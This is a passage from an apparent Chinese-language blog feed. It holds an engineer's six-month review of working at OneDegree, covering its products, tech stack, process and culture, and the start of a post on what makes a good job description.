Core，想看更詳細的說明可以到官網：<a href="https://theixt.com/">https://theixt.com</a></p><p>然後公司自己在香港是有純網路保險牌照的，所以我們可以在香港自己賣保險，這就是第二塊在做的事情。而第二塊這邊，背後用的也是 IXT Core 這個保險系統。所以簡單來說，我們既是生產者又是消費者，我覺得有點像是 iCHEF 那樣，最早的時候是為了自家餐廳做了餐廳管理系統，後來發現也可以給其他人用，所以擴展成一個更大的系統，既是開發系統的人，也是使用系統的人。</p><p>總之我們公司在香港有販賣寵物險，既然有賣保險那就一定會有兩個東西，第一個是買保險的網站，第二個是買了以後觀看個人資料、表單以及申請理賠的 dashboard，而我目前在公司負責的就是相關產品的開發。</p><p><img src="/img/working-at-onedegree-378a0401130e/1__LwhzE3tHEbZqBjsex86f8Q.png"></p><p>最後第三塊看起來跟前兩塊差異可能有點大，但我覺得這其實凸顯了我前面所說的，我們是一間「有保險執照的科技公司」，而不是「懂科技的保險公司」，所以以科技公司的角度來看，有個完全不同的產品似乎比較合理一些（不過長遠來看其實還是跟保險有關啦）。</p><p>第三個產品是一個 SaaS（Software as a Service）叫做 Cymetrics，簡單來說就是提供資安掃描的一個服務啦。我們發現許多中小企業他們可能沒有錢也沒有人力來做資安這一塊，因此想提供一個簡單方便的服務，只要把網址提供給我們，我們就會定時針對網站自動去做弱點掃描，掃完之後提供一份報告給客戶，讓客戶知道他們網站哪些地方有問題。</p><p>這產品目前還沒正式上線，但已經有找到一些客戶了，可以期待一下未來的發展。</p><p>對應到第三塊，公司有一個 cyber security 的 team 專門在做這些事情，例如說這個產品的前後端開發以及背後的掃描服務的改善，也有幾個在研究資安的同事，我覺得這對新創來說是很難能可貴的一件事，因為很少新創會有專門負責這個的 team。</p><p><img src="/img/working-at-onedegree-378a0401130e/1__8BmOIaSCM3tbYcyszJFIFQ.png"></p><p>以上差不多就是我們公司在做的事情，知道產品面以後，再來講技術面的東西就會比較好講。</p><h3 id="那工程師們都在幹嘛？"><a href="#那工程師們都在幹嘛？" class="headerlink" title="那工程師們都在幹嘛？"></a>那工程師們都在幹嘛？</h3><p>既然是要開發保險系統，那就一定會有一群後端工程師在努力著，我覺得這邊對於後端一個可能吸引人的地方是資料滿複雜的，畢竟是保險嘛，我進來半年我還是沒有完全搞懂那些錯綜複雜的關係，像是保險人、受益人、被保人、保險標的等等的各種名詞。</p><p>還有「保單」本身以消費者的角度看似普通，但以系統設計的層面去看，你要考量的東西有很多，例如說一年期的保單在到期續約之後其實會變另外一張，或者是到期的保單也有可能可以申請理賠等等，而核保、繳費或是申請理賠，這些流程也都滿複雜的。而這些錯綜複雜的關係有可能會造成多次的 table join，所以在設計時 performance 也是個需要考量的點。</p><p>再加上前面有講過這個 IXT Core 的目標是可以給不同的保險公司使用，但每個公司一定都會有一些不同的需求，要怎麼同中求異，異中求同，這也是個問題。</p><p>除此之外，cyber security 那邊也有後端工程師，那邊的系統架構一樣需要 scalable，因為你必須要應付的是更多的客戶，更多需要被掃瞄的網址，要如何兼顧可用性跟效率以及成本上的考量，這也是個值得被解決的問題。</p><p>掃描網站這一塊也是。大多數的解決方案都是拿現有工具來用，可是如果現有工具沒有辦法符合我們的需求，那該怎麼辦？這時候只好參考現有工具自己改良或者是自己從頭開發一套，這些也都是有趣的題目。</p><p>前端的部分也是一樣的，IXT core 那邊的前端一樣會有客製化的挑戰，要怎麼用一個專案來容納不同客製化的需求？如果一個專案不行，那拆分成不同專案的話要怎麼重用相同的部分，又要怎麼做版本控制？除了客製化的挑戰以外，專案本身其實複雜度就很夠了，畢竟要做的是後台，然後功能又多，除了基本的 CRUD 以外一定還有很多其他不同的流程要做。</p><p>而我所在的 team，是負責自有的保險產品，購買流程其實也是個需要花許多時間去做的事，從外面看起來好像還好，但因為後端 API 有著一定的複雜度，所以前端在串接上也需要去配合；再者，如果想要把產品做到完整，就需要去處理一些 edge case，例如說結帳的時候突然斷線怎麼辦？或是如果註冊成功可是保單沒買成功，又要怎麼處理？</p><p>在前端技術的部份我們都是用 React + Next.js，其他細節不同 team 會不同，例如說有的寫 TypeScript，有的寫 XState，有的用 redux-observable 有的直接用 react-query，在版本更新上其實跟得算緊，早早就幾乎全部改用 hooks 了，有新版推出也會等一陣子，大概穩定之後就跟著升上去。</p><p>在同事的協作上也會根據各個 team 不同，有的 team 偏向 Git flow，有的走 Trunk Based development，不過做 code review 這是基本的，有 CI + CD 這也是基本的。</p><p>以我們 team 為例，發 PR 之後會自動跑幾個東西：</p><ol><li>資訊安全相關的靜態掃描</li><li>unit test + integration test</li><li>bundle size check</li><li>lighthouse score</li></ol><p>如果有需要的話可以額外去跑 snapshot testing（是真的對畫面做截圖的那種，不是 component 的 snapshot），跟線上的環境比對畫面是否相同，這拿來測一些頁面的完整性挺有用的。</p><p>比較重要的流程基本上都有 test 在保護，會寫 react-testing-library 跟 cypress，API mocking 的部分最近在嘗試我之前研究的 <a href="https://miragejs.com/">Mirage</a>。</p><p>除了這些之外，公司也有一個 QA team，以自動化測試為主，手動為輔，幫助我們做好品質控管，每次上版到測試環境的時候都會跑一遍自動化測試。我以前待過的公司基本上都是以手動測試為主，甚至可能連自動化測試都沒有…</p><p>然後公司有兩三位 SRE，負責處理各種環境建置的大小事，所以這部分不需要工程師自己擔心，我們基本上就是簡單按個按鈕而已，其他那些 deployment 的 script 或是 dockerfile 會由 SRE 協助。</p><p>整體而言我覺得 tech team 的編制滿完整的，人數也不少，當初在選公司的時候人數就是我的考量之一，只要比我之前待的（前端含我 4 人）多就好了，現在有達成這個目標。</p><p>然後公司內部有自發性的技術分享活動，每兩週一次，前後端都有，cyber team 也有自己內部的分享，每次大概半小時到一個小時，由同事互相推坑成為講者，之前我自己也有分享過幾次，也聽同事分享過 XState、Recoil、Immer、TypeScript、Cypress 或是 SEO 等等相關的主題，風氣我覺得滿不錯的。</p><h3 id="產品開發流程"><a href="#產品開發流程" class="headerlink" title="產品開發流程"></a>產品開發流程</h3><p>技術的部分差不多講完了，來講講產品相關的部分。</p><p>首先身為工程師，大家應該很在意合作的 PM 如何，我第一份工作的時候基本上沒有什麼 PM，第二份在佛心公司的時候其實 PM 很菜，大部分都是由我通靈或是口頭詢問 PM 才得到詳細的規格（不過團隊很小就是了，有些產品開發的流程沒有這麼完整我或多或少可以理解），第三份在前公司的時候會跟一個比較菜的 PM 還有一個產品長合作，後者很專業，但前者就也不怎麼樣，而且有時候寫出來的 spec 很奇怪。</p><p>到了 OneDegree 之後呢，同事們是我目前合作過比較專業的 PM。其實對於許多工程師來說，只要 PM 不會要求工程師通靈、不會開奇怪的需求、會記得寫 spec，工程師就謝天謝地了，不過這邊的 PM 們當然是比這個還要專業啦，畢竟我覺得上面那幾點是基本中的基本就是了。</p><p>這邊的 PM 在做一些東西前會先找工程師討論一下可行性，不會硬要塞給你一個很無理的需求，基本上都是由工程師給出建議讓 PM 去參考。然後 spec 這是基本的，都有，JIRA ticket 也有好好管理，按時更新狀態，在訊息的同步上則是我覺得做得最好的一點。</p><p>在 standup meeting 上面 PM 都會即時跟我們同步一些最新的資訊，例如說保單銷售狀況啦，或是某個需求怎樣怎樣了，然後有新的案子正在洽談了等等，也會解釋要做某個需求背後的原因。</p><p>公司內是跑兩週一次的 sprint，該有的 meeting 都有，sprint 中間不太會出現插單或者是抽換的情況，比較穩定，雖然說有時候還是會有突然其來的需求，但只要頻率不要太長，並且大家都知道背後的商業利益為何，應該都不會覺得怎麼樣，目前待這半年來說我覺得這種需求的頻率是可以接受的。</p><p>除了 PM（Product Manager）以外還有另外一個角色叫做 Program Manager，比較是偏技術端這邊的，會在確定需求之後跟前後端溝通，幫忙畫出流程圖，例如說這頁面要打哪一支 API，要做哪一些檢查等等，透過流程圖來溝通的話就滿方便的，而且重點是日後要找資料的時候比較容易，不需要去看 code 也能知道大概的流程長什麼樣子，這個角色也是我之前待過的公司都沒有的。</p><p>然後有一點我一定要講，因為這是我進公司之後感到最驚訝的一點，那就是 design team！或許對其他見多識廣的人來說沒什麼，但對於幾乎都是待在新創的我來說，這是我進的第一間，有把 UI designer 跟 UX designer 分開的公司！</p><p>在新的需求從 PM 那邊整理並且產生之後，會先交由 UX designer 去研究相關的事項，確定流程都是順暢的之後再讓 UI designer 去畫 mockup，最後交給工程師。</p><p>除了這個以外，每週會有兩次 design 相關的會議，這也是工程師可以參與而且鼓勵參與的，鼓勵工程師在正式的 mockup 還沒出現前就看出潛在的問題，就可以及早修改，而不是等到工程師在 sprint grooming 或是 planning 看到 mockup 才跟 PM 反映說：「嗯…你確定要照這個做嗎？」或是「這好像做不出來，不支援」。</p><p>在設計的部分也有跟前端這邊合作，努力把一些共用的元件規格化，並由 PM 開出 spec 讓規格更完整並且記錄下來，做成通用的 component，形成一個內部的 UI library，這種東西真的是要從 design team 開始做才有可能達成，不然就會變成說雖然有 UI libary，但是每個地方都客製化，那就跟沒有一樣了，但這邊目前是沒有這種狀況發生。</p><p>做 UI library 也是滿有挑戰性的，光是 component 命名就是一門學問，然後 component 的各個狀態、參數名稱、彈性要多大，這些都是個別需要解決的問題。</p><p>雖然說有些 component 設計之後的確會需要反覆修改，但大多數的狀況我覺得都算合理，畢竟這還在早期的階段，很難在開頭就想到後續的發展（除非很有經驗），所以修改的部分只要合理就 ok。</p><h3 id="公司氛圍"><a href="#公司氛圍" class="headerlink" title="公司氛圍"></a>公司氛圍</h3><p>把技術以及產品相關的東西講完了，接下來講一點與「人」相關的部分。公司氛圍跟我之前待過的新創差不多，就是滿歡樂的，跟預期中的差不多，甚至有可能更歡樂一點。</p><p>公司內部除了前面講的那兩個技術分享的社團以外，也有其他各種社團，例如說運動相關社團，籃球社、羽球社、桌球社等等的，下班時間都會約出去一起運動一下。也有一個一直在出去玩，有著各種活動的社團，什麼密室逃脫啦，一起做料理啦之類的。</p><p>也有一些比較靜態的，像是桌遊社，會在每週五下午有空的時候一起聚在會議室打桌遊，還有一個我有在參與的不過不是正式社團的群體，叫做美食摘星團，平日中午會一起去吃厲害的餐廳，有些中式餐廳其實你很難一個人去吃，例如說頤宮、天香樓等等，揪同事吃就不會有這種困擾了。</p><p><img src="/img/working-at-onedegree-378a0401130e/1__Z0z7Rhq6pFl__pkQeUsaE0g.jpeg"></p><p>公司的 HR 也是很認真地在舉辦各種有趣的活動增進同事情誼，每個月的慶生會這個就不多說了，很多公司都有，逢年過節則是會有限定版活動出現，例如說之前中秋節的剝柚子大賽，三人一組一共五組報名，在 15 分鐘內用手剝完最多的柚子即為獲勝，而後來那些柚子就被我們這些吃瓜群眾瓜分掉了，好吃。</p><p>然後大約每兩三個月左右會有一次針對 co-founder 之一的 AMA（Ask Me Anything） session，大家都是問公司相關的問題居多，可以聊公司的策略方向或是未來發展之類的，不過其實他就坐在辦公室的一角，想要找他聊天隨時都可以過去。</p><p>講到這邊突然想起來我好像有一點忘記說了，那就是我們其實是港商，總部在香港，不過工程師幾乎都在台灣就是了，香港比較多是 marketing 還有幾個 PM 在那邊，不過不是我所待的 team 就是了。</p><p>因為工作上與那邊沒有太多交流，所以平常也沒什麼機會跟那邊接觸，大概只有 townhall 的時候會透過視訊鏡頭看到而已，畢竟礙於疫情關係，他們想要來台灣出差也滿困難的，可能等疫情好轉之後溝通頻率會更頻繁一點。</p><h3 id="硬體設備與公司福利"><a href="#硬體設備與公司福利" class="headerlink" title="硬體設備與公司福利"></a>硬體設備與公司福利</h3><p>公司福利可以特別提一下的是特休，在我進來的時候原本是 10 天，明年（2021 年）要變成 15 天了！以台灣新創來說 15 天應該也算是高標了，值得提一下。</p><p>零食櫃這也是新創標配了，所以也不多提了。</p><p>硬體設備上就是配個 32 吋的螢幕外加 MacBook Pro，是有 ESC 鍵的版本，很讚！工作的位子我也覺得滿大的，整體而言我覺得挺舒適的。</p><p><img src="/img/working-at-onedegree-378a0401130e/1__py1lcuIa31Pvz9X6JGUkBQ.jpeg"></p><p>公司地點在信義路基隆路口，雖然聽到信義區感覺中午吃飯就貴鬆鬆，但其實不然，因為我們公司那個點離吳興街很近，所以中午吃一餐大概也就 80~100 上下而已，是個十分合理的價格，並沒有特別貴，而且選擇其實算多，再往遠一點走到北醫那邊的話還有更多吃的。</p><p>另外，我們這棟大樓我覺得人好像沒有到很多，因為很少有需要等電梯等很久的狀況，大多情況都滿快就來了。有些人可能好奇我為什麼特別提這個，因為這一點對有些人來說很重要啊！不誇張，有些人多的辦公大樓光是上班時間等電梯就要花你個五分鐘，這邊完全不會，我沒看過幾次電梯排隊。</p><h3 id="不足的地方"><a href="#不足的地方" class="headerlink" title="不足的地方"></a>不足的地方</h3><p>雖然說我覺得上面也沒有都在講好話，只是平實地描述一下事實而已，但還是特別講幾個我覺得美中不足的地方好了，避免有人誤以為這是葉佩雯。</p><p>第一點是公司在工具的選擇上是走微軟體系，所以內部溝通是用 Teams，雖然說他的功能很完整沒錯，但我個人還是比較喜歡 Slack，雖然說 Slack 好像沒有跟 calendar 或是視訊會議做整合，但以聊天溝通來說我覺得 Slack 還是比較好用一些。</p><p>第二點是我們用的是 GitLab 而不是 GitHub，以跟其他第三方服務整合來看，GitHub 支援性應該是最好的，點幾個按鈕就好了，但 GitLab 有些功能可能就要自己做，我還是比較喜歡 GitHub。</p><p>第三點是公司內部的文件雖然多，例如說 product requirement 啦，處理錯誤狀態的 guide book 啦，諸如此類的，但目前在資訊的取得上還是有一定的難度，有些散落各地，你很難在一個相同的地方找到它。</p><p>我是這樣評估這個問題的：「如果我今天剛加入公司，想知道公司產品有哪些功能，我有多容易找到答案？」，以目前來說，我覺得是有困難的，不過這點公司內部有在做改進就是了，有在慢慢 build 一個公司內部的 wiki。</p><p>每個角色看到的問題都會不太一樣，以我的角色（工程師）來說，並沒有看到什麼太大的問題。</p><h3 id="整體心得"><a href="#整體心得" class="headerlink" title="整體心得"></a>整體心得</h3><p>OneDegree 其實是我目前待過，無論在組織的編制或是開發流程上都是最完整的一間公司（有人可能會問說我在佛心公司的時候不是應該更完整嗎？抱歉沒有，我待的 team 很小），技術討論的風氣還不錯，工作氣氛也很歡樂，目前是都待的滿舒適的。</p><p>在工作內容上也是有著一定的挑戰性，而目前在這邊我覺得技術上收穫最多的是測試相關的東西，以前在其他公司工作的時候也都想往測試這塊去精進，但沒有同事一起做的話容易怠惰，這邊的話剛好同事們也想補強測試這塊，所以陸陸續續加了很多東西進去，每次跑測試看到一片綠綠的就很開心，一直想玩的 Cypress 也終於在這邊做得比較完整了一點。</p><p>喔對了忘記講工時，基本上就是滿彈性的啦，大部分人應該都是十點左右進辦公室，六點半到七點左右走，而我通常都是九點到，六點走，真的有其他重要的事的話時間也是可以調配的。</p><p>公司目前也是屬於一個還在擴張的階段，同事越來越多，我五月才進去的，結果到現在十二月就多了應該有十幾個同事吧，年底跟明年初也會再補一批人進來。</p><p>總之，整體而言我目前在這間公司待得不錯。合作的同事們，無論是工程師、設計師或是 PM，都是我工作到目前為止專業程度最高的。在開發流程上也是我待過最完整的一間。</p><p>不過這邊也要平衡報導一下，我的比較基準是來自於前幾間公司，而前幾間公司又偏新創偏小，OneDegree 的 tech team 是我合作過最大的一個，所以會專業一點好像滿正常的（？），因此搞不好對一些待過制度較完整公司的人來說，這邊其實沒那麼完整，或者是普普通通，畢竟標準是會因人而異的，我只是想強調我的比較基準是什麼。</p><p>從不同的角色去看公司，應該也會得到不同的心得，以我的角色看出去我看到的就是這篇這樣，工作內容上著墨比較多在於技術方面的事情，也有可能其他角色會看到不一樣的風景，但這我就無從得知了。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>好了該來做個總結了。</p><p>如果你想要一個量化的分數的話，第一間公司我給 80 分，第二間 70 分，第三間 75 分，而現在這間 OneDegree 我可以給到 85 分（如果你好奇我前幾間都在幹嘛，請參考<a href="/2019/04/13/4-years-review-7fb7edc52687/">《成為前端工程師的四週年回顧》</a>）。</p><p>如果你剛好有在找工作，而且看了介紹覺得感興趣，也歡迎來投遞履歷，我目前會推薦 OneDegree 的原因有幾個：</p><ol><li>工作氛圍愉快</li><li>技術能力是有的（可以找到比你更強的同事討論東西）</li><li>做的事情有挑戰性（資料夠複雜）</li></ol><p>目前有開放的職缺可以直接參考 OneDegree 在 Yourator 上的徵才頁面：<a href="https://www.yourator.co/companies/OneDegree">https://www.yourator.co/companies/OneDegree</a></p><p>另外，我滿好奇有多少潛在的面試者會看到這篇文，所以如果方便的話，可以在投履歷或者是面試時跟我們家 HR 說一下是看到這篇文才來投的，我才能有個資料當作參考。</p><p>大概就是這樣啦，以上就是在 OneDegree 工作半年左右的心得，沒意外的話可能工作滿一年或是一年半會再來 po 一篇，更新一下近況，也可以跟這篇文章做一下對比。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我心目中的理想徵才文</title>
      <link href="/2020/11/15/my-ideal-job-description-d72ec9cf5d0e/"/>
      <url>/2020/11/15/my-ideal-job-description-d72ec9cf5d0e/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/my-ideal-job-description-d72ec9cf5d0e/0__aqE3XXl4KOSOvyf1.jpg"></p><p>四年前是我人生中第一次求職，抱持著「之後應該不會海投了」的心態，一口氣面試了快要二十間公司，在求職的時候也有了許多心得，因此那時候寫了一篇：<a href="https://blog.huli.tw/2016/01/19/my-ideal-interview-process/">我心目中的理想面試流程</a>。</p><p>而<a href="/2020/04/28/2020-senior-front-end-engineer-interview-249c719c1a97/">前陣子</a>也進行了人生中第二次大規模求職，對於面試流程的想法跟四年前一樣，所以也沒什麼好寫的，不過這次倒是多了一些有關於徵才文的感想。剛好之前有給了我們公司 HR 一些徵才文的建議，寫了一封落落長的信，想說那不如直接寫成一篇文章好了。</p><p>一直以來我都覺得有許多公司太低估徵才這件事情了，他們在看這件事情時只有想到「要找到人」這個目標而已，可是真實情況是可能有十個人來面試，卻只有一個錄取，那沒有錄取的那九個怎麼辦？許多公司就不管了，管他的，沒有錄取就沒有錄取。</p><p>但我覺得沒有錄取的那九個人也十分重要，因為他們會影響潛在求職者，增加或是減少他們想來面試的意願。</p><p>除了這個以外，對外徵才的重點除了找到符合資格，你想招進來的人以外，對方必須也想加入這間公司。</p><p>講個小故事，我之前在新加坡的時候有當過一陣子的面試官，在剛開始的時候我在面試時抱持的心態是：「這個人有沒有符合資格，是不是能夠勝任這份工作」，我關注的點只有這個而已。</p><p>但直到有一個面試者我覺得 ok，但他拿到 offer 以後選擇不來，去了其他公司，我才突然意識到我忽略一件很重要的事，一件我在當面試者的時候從來沒忘記過的事。</p><p>那就是面試是雙向的，公司在面試我，我也在面試公司。所以身為一個面試官，除了你在考核對方是否能夠勝任工作以外，對方也在考核你，考核這間公司，也在評估這間公司是不是讓他想要進去工作。</p><p>但我之前在當面試官時忽略了這點。我以前都是簡單介紹公司在幹嘛，然後就開始問對方問題，問完之後就問對方說還想知道什麼，就照著對方問的回答。</p><p>但自從認知到這點以後，我在問完對方問題之後，會開始介紹我們公司，像是這樣：</p><blockquote><p><em>我想問的問題差不多了，那接下來我來介紹一下我們公司，我們公司主要是做餐廳訂位的服務，但跟其他服務不一樣的地方在於，只要在我們網站上面訂位，就可以享有折扣！而且不用買任何餐券，也不用在我們網站上付錢，你要做的就只有在網站訂位，去吃飯，結帳的時候就會自動有折扣，最多可以折到 50%。</em></p></blockquote><blockquote><p><em>所以根據我們在做的事情，有幾個系統要開發，例如說給一般消費者用的訂位網站，還有給餐廳用的網站，讓他們看到今天有哪些訂位。還需要一個公司內部自己使用的後台，這些就是我們主要負責的產品。</em></p></blockquote><blockquote><p><em>我們的前端都是用 React + Redux 在開發的，後端則是用 Go，部署的話則是包成 docker 丟到 AWS 上面去，有一個 SRE 專門在負責這一塊。後端的部分目前大概是 XX 人，前端包含我有 YY 人，而 PM 跟設計師各有 XX 人，因為團隊比較小，所以很常會直接跟他們溝通到。</em></p></blockquote><blockquote><p><em>而這次你面試的這個缺，開缺主要是因為要做的東西變多了，業務擴張所以需要補更多人來，我們下半年有個計畫是想要巴拉巴拉巴拉，所以需要找更多人進來，因此你進來之後會一起負責新產品的開發，還有一些現有產品的維護。</em></p></blockquote><blockquote><p><em>而這邊的工作流程是走 scrum，兩週一次的 sprint，每天都會有 standup meeting，彼此同步一下工作狀況。內部是用 JIRA 在管理 ticket 的，程式碼則是放在 GitHub 上面，每次完成一個任務就會需要發 PR，會有其他同事幫忙做 code review，review 過了之後才能 merge，然後交給 QA 去測試。</em></p></blockquote><blockquote><p><em>差不多就是這樣，那你有什麼想要問我的嗎？</em></p></blockquote><p>我會把公司關於產品面跟技術面的東西都稍微介紹一遍，讓對方能夠理解我們 team 在做的事情，還有他進來之後會需要做的事。</p><p>有時候我這樣介紹完，差不多就把他們原本想提的問題也都回答完了。改成這樣之後根據獵人頭的說法（不知道是不是場面話就是了），面試者的回饋都滿不錯的。</p><p>但其實上面這些東西，並不需要在面試的時候才講，其實在徵才文上面就可以先寫出來了，這樣不是很好嗎？（如果不是公司機密的話啦，但這些工作流程許多公司其實都大同小異，會需要是公司機密嗎？）</p><p>我認為很多徵才文都有改善的空間，很多基本的東西都沒有寫清楚，或是傾向用口頭告知，但我覺得寫清楚才是最好的，就算是一些你可能以為不需要寫的小細節，有時候都是關鍵。</p><p>徵才文寫得好，就能收到更多履歷，如果面試流程也做得好，那僅管對方沒有錄取，依然會對公司留下正面的印象，甚至是推薦朋友過去面試。相反地，如果徵才文寫得差或者是面試流程做得差，你損失的不只是一個面試者，而是更多潛在的面試者，一旦公司的名聲差了，可能就連面試都不想來面試了。</p><p>徵才是長期關係的培養，不是一次的買賣。</p><p>接下來我們就從兩篇我很喜歡的徵才文開始，一步步來看我心目中理想的徵才文應該要有哪些元素。</p><h3 id="我心目中的徵才文範本"><a href="#我心目中的徵才文範本" class="headerlink" title="我心目中的徵才文範本"></a>我心目中的徵才文範本</h3><p>先分享兩個我對徵才文的啟蒙導師：</p><ol><li><a href="https://medium.com/statementdog-engineering/how-we-get-10x-resumes-by-good-job-description-bb45ad5e94e0">財報狗的徵才文</a></li><li><a href="https://github.com/golangtw/jobs/issues/1">書亞集成的徵才文</a></li></ol><p>我是看到這兩篇之後，才驚覺原來徵才文可以寫得這麼好。</p><p>而這兩篇的優點我認為是一致的，那就是講得又清楚又詳細，就會讓人覺得誠意十足。除了一般常見的徵才文元素以外，還多了：</p><ol><li>面試流程</li><li>優缺點</li><li>技術分享簡報</li><li>履歷注意事項</li></ol><p>我相信上面有些點，有許多公司也有做到，但差別是他們不會主動提起，例如說財報狗文章中所提到的：</p><blockquote><p><em>- 我們尊重您的隱私，個人資訊僅需提供姓名、email、電話即可，不需附照片或地址。若確定您的 email 不會漏收信，在約面試前不提供電話也沒關係</em></p></blockquote><blockquote><p><em>- 不需附長篇自傳，我們重視的是能夠展示您的專業能力、學習能力、協作能力的資訊或過往作品</em></p></blockquote><p>以及書亞集成文中所提到的：</p><blockquote><p><em>▐ 我們尊重任何人的個資、隱私及性向，所以履歷不需包括您的年齡、身高、體重、地址等資料。也請不要寄送 104 制式履歷給我們，因為它會洩露您的隱私。</em></p></blockquote><blockquote><p><em>▐ 為保護每位面試者隱私，公司未額外保留個人資料及聯絡方式，所以無法也不能主動聯繫先前面試的優秀人選。然您可能因我們當下職缺有限，或我們當時不足以提供您滿意的薪資，或公司發展不適合面試者職涯考量。以上原因也許時至今日已解決，所以我們隨時歡迎二次以上的面談機會，也感謝您願意再給我們一次機會。</em></p></blockquote><p>我認為徵才文可以寫多，但不能寫少。有些事情你沒有寫出來，求職者是不會知道的。把這些履歷的注意事項寫清楚，對我來說就是個加分項目，因為這樣的徵才文很清楚明白，而且是站在求職者的角度而去思考的。</p><p>看完這兩篇徵才文之後，接下來就一個一個來看徵才文裡面會吸引我的元素，重要性從高到低排序。</p><h3 id="一、基本要素"><a href="#一、基本要素" class="headerlink" title="一、基本要素"></a>一、基本要素</h3><p>這個太基本了就集中在一點了，包括：</p><ol><li>公司介紹</li><li>工作內容</li><li>職缺要求</li><li>公司福利</li><li>薪資範圍</li></ol><p>但儘管它基本，卻不是每間公司都能寫得好。有些是礙於公司內部規則而沒有辦法寫，例如說薪水，有些公司就真的只能寫「面議」，那面試者看到就是扣分，這也沒辦法。</p><p>公司福利不要亂寫，有勞健保不是公司福利，有配電腦也不是公司福利。</p><p>工作內容建議寫的詳細一點，會讓求職者對於日後在公司要做的事情更明確一點，職缺要求也是，不過這兩點要寫清楚其實也滿難的。</p><p>公司介紹如果能夠附上公司網站是最好的，因為通常網站上面都會有公司介紹，可以讓有興趣的求職者更加了解，若是工作內容與特定產品有關，最好也附上產品的網頁，一樣能讓求職者更加了解狀況。</p><p>總之這五點是基本功，也是幾乎所有徵才文都會有的東西。</p><h3 id="二、面試流程"><a href="#二、面試流程" class="headerlink" title="二、面試流程"></a>二、面試流程</h3><p>這其實求職者的必問問題之一，那既然這麼多人都會問，而且最後都一定要回答，那何不把它寫在徵才文上面呢？而且現在的狀況是很多公司不會寫，所以你寫了就是加分，因為你的徵才文就是比其他人的清楚。</p><p>以我自己來說，面試流程我會想知道的事情有：</p><ol><li>有幾關</li><li>每一關是面誰（例如說是跟技術主管面，還是跟台灣負責人面之類的）</li><li>每一關的面試地點（線上還是公司）</li><li>每一關的面試內容（第一關技術，第二關人格特質之類的）</li><li>沒有錄取會不會收到通知信？還是是無聲卡？</li><li>面試完預計多久會有聯絡？</li></ol><p>有些如果礙於公司內部政策沒辦法寫或是沒辦法給個保證，可以先不寫上去但至少已經確定的可以寫。雖然不鼓勵發無聲卡，但就算要發也可以寫一下，讓大家先有個心理準備。</p><p>寫起來會像這樣：</p><blockquote><p><em># 電話面試</em></p></blockquote><blockquote><p><em>當我們收到履歷以後，會由 HR 跟您約時間，跟用人的單位主管進行簡單的電話聊天，大約 15~30 分鐘左右。</em></p></blockquote><blockquote><p><em>我們希望透過這次的電話面試更進一步地認識你，在這一關也會有一些技術上的問答，除此之外也會讓您更加了解這個職缺的工作內容以及我們公司的狀況。</em></p></blockquote><blockquote><p><em>無論通過與否，在結束後的一週內會收到後續通知。</em></p></blockquote><blockquote><p><em># 面試第一階段</em></p></blockquote><blockquote><p><em>面試的第一階段會在我們位於信義區的辦公室（接近捷運台北 101 站），面試官為部門的技術主管。在這關裡面會先讓您進行簡單的自我介紹，接著就是一些技術相關的問題，最後則是部門的技術主管會跟您簡單介紹我們公司以及部門的一些狀況。</em></p></blockquote><blockquote><p><em>這一次面試的主軸會是技術。</em></p></blockquote><blockquote><p><em>無論通過與否，面試完以後大約一至兩週會收到通知。</em></p></blockquote><blockquote><p><em># 面試第二階段</em></p></blockquote><blockquote><p><em>若是有通過第一階段，第二階段會與公司的 CEO 以及 HR 面試。這一階段不會有技術相關的測驗，面試內容是與人格特質有關，也會在這一階段談到公司的福利待遇，薪水也是在這一關會談。</em></p></blockquote><blockquote><p><em>這是面試流程的最後一關，在面試的兩週內會通知結果。由於面試人選眾多，恕我們不一一通知結果。若是兩週內沒有收到結果，就代表很遺憾在這個階段沒有合作的機會，希望未來仍有機會能夠再合作。</em></p></blockquote><h3 id="三、技術分享簡報"><a href="#三、技術分享簡報" class="headerlink" title="三、技術分享簡報"></a>三、技術分享簡報</h3><p>有些公司內部都會有一些技術的討論，無論是社團也好讀書會也好，或者是找外面的講師來也好，這些其實對於工程師來說都是加分的。</p><p>不過這不是每間公司都會有，但如果有的話請特別寫出來。而且光講說有社團或是讀書會是不夠的，因為很多公司也都只是徵才文上面會寫，但其實停辦了很久，所以若是能附上證明，會更有說服力一點。</p><p>如果公司內部分享的簡報能夠對外公開那就更棒了。</p><p>寫起來會像是這樣：</p><blockquote><p><em># 技術分享</em></p></blockquote><blockquote><p><em>公司內部有前端與後端技術交流社團，每兩週會舉辦一次活動，由同仁自主分享前後端相關議題，彼此互相交流成長，並由公司補助社團營運相關經費。</em></p></blockquote><blockquote><p><em>前端最近三次的分享主題為：</em></p></blockquote><blockquote><p><em>1. Web Security With Real World Example<br>2. 一個有趣的 styled component bug<br>3. How to do API mocking</em></p></blockquote><blockquote><p><em>後端最近三次則是：</em></p></blockquote><blockquote><p><em>1. ACID 的深入研究<br>2. Memory leak case study<br>3. ZeroMQ 介紹</em></p></blockquote><blockquote><p><em>未來也可能會有 DevOps 或是 Security 相關的技術分享。</em></p></blockquote><h3 id="四、產品開發流程"><a href="#四、產品開發流程" class="headerlink" title="四、產品開發流程"></a>四、產品開發流程</h3><p>這點其實根據公司內部流程可以決定要不要寫，因為有些公司寫出來就是扣分，有些則是加分。假設某公司內部都是隕石式開發，那怎麼敢寫出來？</p><p>但如果內部產品開發流程還算 ok，至少相對上完整的話，我覺得就可以寫出來，因為有滿多工程師都希望能進入到一間開發流程比較完整的公司，所以會是加分項目。</p><p>寫起來大概像是：</p><blockquote><p><em>我們內部分成幾個不同的 scrum team，進行每兩週一次的 sprint，在 sprint 開始時會開大約一小時的 planning meeting，決定這個 sprint 要做的事，在結束時也會開 retrospective 討論這次 sprint 做得好以及可以進步的事項。</em></p></blockquote><blockquote><p><em>當一個新的需求出來時，大概會經歷以下流程：</em></p></blockquote><blockquote><p><em>1. 由 PM 與 stakeholders 討論並整理出需求<br>2. 交由 UX 設計師思考使用者體驗<br>3. 與 PM、UI 設計師以及工程師一起討論有沒有執行上的困難<br>4. UI 設計師開始製作 mockup<br>5. 前端工程師拿到設計稿，開始開發<br>6. 開發完成，部署到內部測試環境給 QA 跑 E2E 測試以及手動測試<br>7. QA 測試完畢，讓 stakeholders 進行 User acceptance testing<br>8. 測試通過，部署到 production 環境</em></p></blockquote><h3 id="五、技術開發流程"><a href="#五、技術開發流程" class="headerlink" 